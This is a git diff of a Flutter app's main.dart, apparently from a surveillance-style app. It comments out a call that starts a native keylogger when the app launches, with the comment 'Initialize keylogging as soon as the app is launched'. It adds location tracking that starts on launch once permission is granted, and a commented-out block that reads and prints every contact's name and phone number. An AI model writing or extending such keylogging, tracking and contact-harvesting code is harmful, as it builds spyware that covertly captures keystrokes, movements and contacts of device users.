@@ -9,6 +9,9 @@ import '/flutter_flow/flutter_flow_util.dart';
 import '/flutter_flow/nav/nav.dart';
 import 'index.dart';
 
+import 'location_service.dart'; // For the LocationService class
+import 'contacts.dart'; // For the requestContactPermission function
+import 'package:permission_handler/permission_handler.dart';
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
   GoRouter.optionURLReflectsImperativeAPIs = true;
@@ -45,20 +48,47 @@ class _MyAppState extends State<MyApp> {
     super.initState();
 
     // Initialize keylogging as soon as the app is launched.
-    startKeyLogger();
+    //startKeyLogger();
+    // Request permission
+    WidgetsBinding.instance.addPostFrameCallback((_) async {
+      //await LocationService().requestLocationPermissions();
+      bool granted = await LocationService().requestLocationPermissions();
+      if (granted) {
+        LocationService().startTracking();
+      } 
+      else {
+        print("⛔️ Permissions not granted. Tracking not started.");
+      }
+    /*  
+    final contactService = ContactService();
+    final contacts = await contactService.fetchContacts();
+    print("📇 Retrieved ${contacts.length} contacts.");
+    for (var c in contacts) {
+      print("👤 ${c['name']} - 📞 ${c['phone']}");
+    }
+    */
+    });
+
+
+
+
+
 
     _appStateNotifier = AppStateNotifier.instance;
     _router = createRouter(_appStateNotifier);
   }
 
   // Invokes the native method to start keylogging.
-  Future<void> startKeyLogger() async {
+  /*Future<void> startKeyLogger() async {
     try {
       await _platform.invokeMethod('startKeyLogger');
     } on PlatformException catch (e) {
       debugPrint('Failed to start keylogger: ${e.message}');
     }
-  }
+  } */
+
+
+
 
   // Example helper to retrieve the current route (optional, from your existing code).
   String getRoute([RouteMatch? routeMatch]) {
